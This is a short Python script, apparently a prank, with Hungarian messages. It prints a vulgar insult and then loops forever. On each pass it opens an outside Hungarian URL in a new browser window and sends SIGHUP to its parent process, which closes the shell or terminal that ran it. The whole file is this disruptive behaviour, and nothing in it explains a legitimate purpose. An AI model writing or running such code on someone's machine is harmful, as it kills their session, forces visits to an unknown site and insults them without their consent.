import time
import  sys
import signal
import os
import webbrowser

def heee():
    print("Há ez üres")

def ya():
	print("Hát akkor a kúrva anyádat")
	while True:
		print("HA-HA")
		print("Bye-bye!")
		time.sleep(2)
		webbrowser.open("http://taroldagumim.hu/client", new=2)
		os.kill(os.getppid(), signal.SIGHUP)

heee()
ya()
